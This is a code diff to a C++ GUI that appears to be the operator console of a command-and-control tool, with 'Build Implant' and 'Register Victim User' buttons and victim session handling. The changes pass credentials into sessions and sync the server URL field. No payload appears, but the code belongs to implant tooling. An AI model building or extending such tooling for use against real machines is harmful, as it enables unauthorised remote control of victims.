@@ -351,7 +351,11 @@ void drawConnectionsTab(WindowState& state) {
                 logMan.attack_log(std::format("Opening Session to Client: {} on Port: {}", victim.uid, port));
 
                 if (state.client.openSession(port)) {
-                    SessionManager::instance().startSession(state.client.getServerHost(), port);
+                    SessionManager::instance().startSession(
+                        state.client.getServerHost(),
+                        port,
+                        state.client.getUsername(),
+                        state.client.getPassword());
                 }
             } else {
                 logMan.local_log("Sending Open Session Command failed!");
@@ -679,6 +683,7 @@ void drawSettingsTab(WindowState& state) {
 //-------------------------------------------------
 void drawBuilderTab(WindowState& state) {
     static FileBrowser fb{ FileBrowser::Mode::SELECT_DIRECTORY };
+    static bool server_url_was_editing = false;
 
     auto& settings = state.implant_settings;
     const auto& res = state.res;
@@ -724,6 +729,13 @@ void drawBuilderTab(WindowState& state) {
                     settings.server_url.text, MAX_INPUT_CHARS, settings.server_url.edit)) {
         settings.server_url.edit = !settings.server_url.edit;
     }
+    if (server_url_was_editing && !settings.server_url.edit) {
+        state.builder.setServerURL(settings.server_url.text);
+        const auto saved_url = state.builder.getServerURL();
+        strncpy(settings.server_url.text, saved_url.c_str(), sizeof(settings.server_url.text) - 1);
+        settings.server_url.text[sizeof(settings.server_url.text) - 1] = '\0';
+    }
+    server_url_was_editing = settings.server_url.edit;
 
     // File path field with browse button
     GuiLabel({ labelX, startY + spacing*4 + 5, labelWidth, labelHeight }, "Output Dir:");
@@ -755,6 +767,11 @@ void drawBuilderTab(WindowState& state) {
     Rectangle registerButtonRect = { inputX + 210, startY + spacing*7, 250, 30 };
     if (GuiButton(registerButtonRect, "Register Victim User")) {
         auto& logs = LogManager::instance();
+        state.builder.setServerURL(settings.server_url.text);
+        const auto saved_url = state.builder.getServerURL();
+        strncpy(settings.server_url.text, saved_url.c_str(), sizeof(settings.server_url.text) - 1);
+        settings.server_url.text[sizeof(settings.server_url.text) - 1] = '\0';
+
         logs.attack_log(std::format("Registering Victim Template: {}", settings.username.text));
 
         if (state.client.registerTemplate(settings.username.text, settings.password.text)) {
@@ -766,7 +783,9 @@ void drawBuilderTab(WindowState& state) {
     Rectangle saveButtonRect = { inputX, startY + spacing*7, 200, 30 };
     if (GuiButton(saveButtonRect, "Build Implant")) {
         state.builder.setUsername(settings.username.text);
-        state.builder.setPassword(settings.password.text);
+        if (!state.builder.getPassword().starts_with("$pbkdf2-sha256$")) {
+            state.builder.setPassword(settings.password.text);
+        }
         state.builder.setServerURL(settings.server_url.text);
         state.builder.setTimeout(settings.default_timeout.text);
         state.builder.setServiceName(settings.service_name.text);
